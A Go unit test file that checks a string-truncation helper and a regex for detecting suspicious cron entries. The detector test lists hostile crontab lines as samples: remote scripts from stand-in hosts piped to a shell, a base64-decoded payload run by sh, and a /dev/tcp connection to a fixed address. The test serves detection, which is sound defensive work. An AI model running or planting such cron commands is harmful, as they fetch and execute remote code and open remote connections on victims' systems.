package engine

import (
	"strings"
	"testing"
)

func TestTruncate(t *testing.T) {
	cases := []struct {
		input  string
		maxLen int
		check  func(string) bool
		desc   string
	}{
		{"short", 100, func(s string) bool { return s == "short" }, "short string unchanged"},
		{"hello world", 5, func(s string) bool { return strings.HasPrefix(s, "hello") && strings.Contains(s, "truncated") }, "long string truncated"},
		{"", 10, func(s string) bool { return s == "" }, "empty string"},
		{"exact", 5, func(s string) bool { return s == "exact" }, "exact length"},
		{"exceed", 5, func(s string) bool { return len(s) > 5 && strings.Contains(s, "truncated") }, "one over"},
	}
	for _, c := range cases {
		got := truncate(c.input, c.maxLen)
		if !c.check(got) {
			t.Errorf("truncate(%q, %d) = %q — %s", c.input, c.maxLen, got, c.desc)
		}
	}
}

func TestSuspiciousCronRegex(t *testing.T) {
	suspicious := []string{
		"* * * * * curl https://evil.com/x | bash",
		"0 3 * * * wget http://malware.com/s | sh",
		"*/5 * * * * curl -s https://c2.net/p | python",
		"0 0 * * * echo payload | base64 -d | sh",
		"* * * * * bash -c 'cat < /dev/tcp/1.2.3.4/4444'",
	}
	for _, s := range suspicious {
		if !suspiciousCronRe.MatchString(s) {
			t.Errorf("expected suspicious match for: %q", s)
		}
	}

	safe := []string{
		"0 * * * * /usr/bin/logrotate /etc/logrotate.conf",
		"30 2 * * * /home/user/backup.sh",
		"*/5 * * * * curl https://healthcheck.io/ping/abc123",
		"0 6 * * * find /tmp -mtime +7 -type f",
	}
	for _, s := range safe {
		if suspiciousCronRe.MatchString(s) {
			t.Errorf("expected safe, but matched suspicious: %q", s)
		}
	}
}
